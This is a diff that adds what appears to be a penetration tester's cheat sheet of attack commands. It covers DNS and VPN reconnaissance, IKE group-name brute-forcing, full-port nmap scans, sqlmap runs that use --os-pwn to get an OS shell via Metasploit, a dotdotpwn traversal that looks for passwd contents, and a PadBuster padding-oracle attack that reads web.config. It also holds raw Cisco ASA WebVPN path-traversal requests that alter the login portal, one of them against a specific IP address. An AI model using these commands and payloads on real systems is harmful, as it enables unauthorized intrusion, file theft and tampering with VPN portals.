@@ -1,0 +1,111 @@
+# Load Balancer Detector
+lbd <dns name>
+halberd <dns name>
+
+# DNS:
+dig <dns name> > dig.txt
+
+nslookup <dns name> > nslookup.txt
+
+dnsmap <dns name> > dnsmap.txt
+
+dnsdict6 <dns name> > dns6.txt
+
+whois <dns name>
+
+# Dump lots of good DNS info. Forward
+dnsrecon -d <domain name> -w > dnsrecon.txt
+
+# Get the DNS reverse lookup on IPs. Reverse
+dnsrecon -r 66.249.92.100-66.249.92.150
+
+# zone xfer
+dnswalk <dns name>. > dnswalk.txt
+
+# for VPN
+ike-scan -vv --multiline -A --id=test <IP>
+
+sudo python groupenum.py -w /opt/Wordlists/groupnames.dic -t <IP>
+sudo ikeforce.py <IP> -e -w wordlists/groupnames.dic -t 5 <1-6> 1 2 
+sudo ike-scan <IP> -M -A --id=<id name from ikeforce> -P<outputFileName>
+
+~/Applications/ikeforce$ sudo python ikeforce.py <IP> -e -w wordlists/groupnames.dic -t 5 2 1 2
+
+
+# Cisco VPN version number
+https://<IP>/CSCOSSLC/config-auth
+
+snmpcheck -c public <IP>
+
+# Port scan
+# Full
+# nmap -vv -Pn -T4 -iL <inputFile.txt> -oX nmapQuick-<company>.xml   #old
+
+nmap -vv -PE -p- -T4 -O -sU --open -sV -oX nmapUDP.xml <IP> 
+nmap -vv -PE -p- -T4 -O --open -sV -oX nmap.xml <IP>
+
+#Service detect - long
+nmap -vv -Pn --version-all -T4 -iL <inputFile.txt> -oX nmapService-<company>.xml
+
+
+# Skipfish
+touch <wordlist>
+skipfish -o skipfish -W wordlist.txt https://<ip>
+
+
+
+# SQLmap   http://www.forkbombers.com/2013/05/sqlmaps-tamper-scripts.html
+~/Applications/sqlmap-dev$ sudo python sqlmap.py -u <URL> --level=5 --risk=3 --data="<body of POST>" --tamper=bluecoat.py --threads=5
+# SQLMap using a file with the HTTP request. 
+sudo sqlmap -r request.txt -p <parameter> --risk=3 --level=5 --tamper=bluecoat.py --dbms=mysql -a --technique=BU --threads=5
+sudo sqlmap -r /opt/PWK/Files/252/POST.txt -p "period_id" --os-pwn --threads=5 --dbms=mysql --msf-path=/opt/metasploit/apps/pro/msf3/
+
+# Directory traversal
+./dotdotpwn.pl -m http-url -h 192.168.17.235 -u http://192.168.17.235:80/section.php?page=TRAVERSAL -o unix -d 4 -s -e %00% -k "root:" -b
+
+#dirb 
+http://www.site.com/directory1/ wordlist.txt
+
+# PadBuster
+# http://blog.gdssecurity.com/labs/2010/10/4/padbuster-v03-and-the-net-padding-oracle-attack.html
+~/Applications/PadBuster-master$ sudo ./padBuster.pl https://<IP address>/ScriptResource.axd?d=AAAAAAAAAAAAAAAAAAAAAA2 AAAAAAAAAAAAAAAAAAAAAA2 16 -encoding 3 -plaintext "|||~/web.config"
+
+
+
+
+# SIP
+sudo sipsak -vv -r 5060 -s sip:administrator@<IP>
+
+
+
+
+# Cisco ASA
+https://<IP>/CSCOSSLC/config-auth
+
+GET /+CSCOE+/cedsave.html?obj=DfltCustomization&preview=logon&f=logon&pf=logon&ced=../../locale/en/LC_MESSAGES/webvpn.mo HTTP/1.1
+Host: <IP>
+Accept: */*
+Cookie: ced=../../locale/en/LC_MESSAGES/webvpn.mo
+
+
+POST /+CSCOE+/cedf.html HTTP/1.1
+User-Agent: Java/1.7.0_65
+Cookie: ced=../../locale/ru/LC_MESSAGES/webvpn.mo;
+Host: 219.101.212.12
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-type: application/x-www-form-urlencoded
+Content-Length: 0
+ 
+a=preview&obj=DfltCustomization&f=title&preview=logon&application%2F1%2Fid=home&application%2F1%2Ftab-title=Home&application%2F1%2Forder=1&application%2F1%2Fmode=enable&application%2F2%2Fid=web-access&application%2F2%2Ftab-title=Web+Applications&application%2F2%2Forder=2&application%2F2%2Fmode=enable&application%2F3%2Fid=file-access&application%2F3%2Ftab-title=Browse+Networks&application%2F3%2Forder=3&application%2F3%2Fmode=enable&application%2F4%2Fid=net-access&application%2F4%2Ftab-title=AnyConnect&application%2F4%2Forder=4&application%2F4%2Fmode=enable&auth-page%2Fform-order%2Fusername=200&auth-page%2Fform-order%2Fsecondary-password=600&auth-page%2Fform-order%2Fsecondary-username=500&auth-page%2Fform-order%2Finternal-password=400&auth-page%2Fform-order%2Fgroup=100&auth-page%2Fform-order%2Fpassword=300&column%2F1%2Forder=1&column%2F1%2Fwidth=100&pane%2F1%2Fmode=disable&pane%2F1%2Ftype=TEXT&pane%2F1%2Ftext=&pane%2F1%2Ftitle=&pane%2F1%2Fnotitle=no&pane%2F1%2Furl=&pane%2F1%2Fcolumn=0&pane%2F1%2Frow=0&pane%2F1%2Fborder=no&pane%2F1%2Fheight=&pane%2F2%2Fmode=disable&pane%2F2%2Ftype=IMAGE&pane%2F2%2Ftext=&pane%2F2%2Ftitle=&pane%2F2%2Fnotitle=no&pane%2F2%2Furl=&pane%2F2%2Fcolumn=0&pane%2F2%2Frow=0&pane%2F2%2Fborder=no&pane%2F2%2Fheight=&pane%2F3%2Fmode=disable&pane%2F3%2Ftype=HTML&pane%2F3%2Ftext=&pane%2F3%2Ftitle=&pane%2F3%2Fnotitle=no&pane%2F3%2Furl=&pane%2F3%2Fcolumn=0&pane%2F3%2Frow=0&pane%2F3%2Fborder=no&pane%2F3%2Fheight=&pane%2F4%2Fmode=disable&pane%2F4%2Ftype=RSS&pane%2F4%2Ftext=&pane%2F4%2Ftitle=&pane%2F4%2Fnotitle=no&pane%2F4%2Furl=&pane%2F4%2Fcolumn=0&pane%2F4%2Frow=0&pane%2F4%2Fborder=no&pane%2F4%2Fheight=&auth-page%2Fwindow%2Ftitle-text=SSL+VPN+Service&auth-page%2Ftitle-panel%2Fmode=enable&auth-page%2Ftitle-panel%2Ftext=SSL+VPN+Service+OWL&auth-page%2Ftitle-panel%2Flogo-url=%2F%2BCSCOU%2B%2Fcsco_logo.gif&auth-page%2Ftitle-panel%2Fgradient=yes&auth-page%2Ftitle-panel%2Ffont-weight=normal&auth-page%2Ftitle-panel%2Ffont-size=100%25&auth-page%2Ftitle-panel%2Ffont-color=%23800000&auth-page%2Ftitle-panel%2Fbackground-color=%23ffffff&auth-page%2Finfo-panel%2Fmode=disable&auth-page%2Finfo-panel%2Fposition=left&auth-page%2Finfo-panel%2Ftext=&auth-page%2Finfo-panel%2Fimage-url=%2F%2BCSCOU%2B%2Fclear.gif&auth-page%2Finfo-panel%2Fimage-position=above&auth-page%2Ftitle-panel%2Fstyle=&auth-page%2Flanguage-selector%2Fmode=disable&auth-page%2Flanguage-selector%2Ftitle=Language%3A&language%2F1%2Fcode=en&language%2F1%2Ftext=English&language%2F2%2Fcode=ja&language%2F2%2Ftext=%E6%97%A5%E6%9C%AC+%28Japanese%29&language%2F3%2Fcode=fr&language%2F3%2Ftext=Fran%C3%A7ais+%28French%29&language%2F4%2Fcode=ru&language%2F4%2Ftext=%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9+%28Russian%29&auth-page%2Flogon-form%2Ftitle-text=Login&auth-page%2Flogon-form%2Fmessage-text=Please+enter+your+username+and+password.&auth-page%2Flogon-form%2Fusername-prompt-text=USERNAME%3A&auth-page%2Flogon-form%2Fsecondary-username-prompt-text=2nd+Username&auth-page%2Flogon-form%2Fpassword-prompt-text=PASSWORD%3A&auth-page%2Flogon-form%2Fsecondary-password-prompt-text=2nd+Password&auth-page%2Flogon-form%2Fpasscode-prompt-text=Passcode&auth-page%2Flogon-form%2Fsecondary-passcode-prompt-text=2nd+Passcode&auth-page%2Flogon-form%2Finternal-password-prompt-text=Internal+Password%3A&auth-page%2Flogon-form%2Finternal-password-hide=no&auth-page%2Flogon-form%2Fgroup-prompt-text=GROUP%3A&auth-page%2Flogon-form%2Fsubmit-button-text=Login&auth-page%2Flogon-form%2Fborder-color=%23858A91&auth-page%2Flogon-form%2Ftitle-font-color=%23ffffff&auth-page%2Flogon-form%2Ftitle-background-color=%23666666&auth-page%2Flogon-form%2Ffont-color=%23000000&auth-page%2Flogon-form%2Fbackground-color=%23ffffff&auth-page%2Fcopyright-panel%2Fmode=disable&auth-page%2Fcopyright-panel%2Ftext=&auth-page%2Ffull-customization%2Fmode=disable&auth-page%2Ffull-customization%2Furl=&auth-page%2Ffull-customization%2Fdoctype=&auth-page%2Flogout-form%2Ftitle-text=Logout&auth-page%2Flogout-form%2Fmessage-text=Goodbye.%3Cbr%3E%0AFor+your+own+security%2C+please%3A%3Cbr%3E%0A%3Cli%3EClear+the+browser%27s+cache%0A%3Cli%3EDelete+any+downloaded+files%0A%3Cli%3EClose+the+browser%27s+window&auth-page%2Flogout-form%2Flogin-button-text=Logon&auth-page%2Flogout-form%2Fhide-login-button=no&auth-page%2Flogout-form%2Fborder-color=%23858A91&auth-page%2Flogout-form%2Ftitle-font-color=%23ffffff&auth-page%2Flogout-form%2Ftitle-background-color=%23666666&auth-page%2Flogout-form%2Ffont-color=%23000000&auth-page%2Flogout-form%2Fbackground-color=%23ffffff&portal%2Fwindow%2Ftitle-text=&portal%2Ftitle-panel%2Fmode=enable&portal%2Ftitle-panel%2Ftext=SSL+VPN+Service&portal%2Ftitle-panel%2Flogo-url=%2F%2BCSCOU%2B%2Fcsco_logo.gif&portal%2Ftitle-panel%2Fgradient=yes&portal%2Ftitle-panel%2Ffont-weight=bold&portal%2Ftitle-panel%2Ffont-size=larger&portal%2Ftitle-panel%2Ffont-color=%23800000&portal%2Ftitle-panel%2Fbackground-color=%23ffffff&portal%2Ftitle-panel%2Fstyle=&portal%2Fnavigation-panel%2Fmode=enable&portal%2Ftoolbar%2Fmode=enable&portal%2Ftoolbar%2Fprompt-box-title=Address&portal%2Ftoolbar%2Fbrowse-button-text=Browse&portal%2Ftoolbar%2Flogout-prompt-text=Logout&portal%2Fhome-page%2Fmode=standard&portal%2Fhome-page%2Furl=&portal%2Furl-lists%2Fmode=group&localization%2Flanguages=en%2Cja%2Cfr%2Cru&localization%2Fdefault-language=
+
+
+
+##### IPv6 Bypass
+#Test bypass techniques to open port:
+firewall6 eth0 2001:db8:2::2 80
+
+#Test bypass techniques to filtered port:
+firewall6 eth0 2001:db8:2::2 22
+
+implementation6 –p eth0 2001:db8:2::2
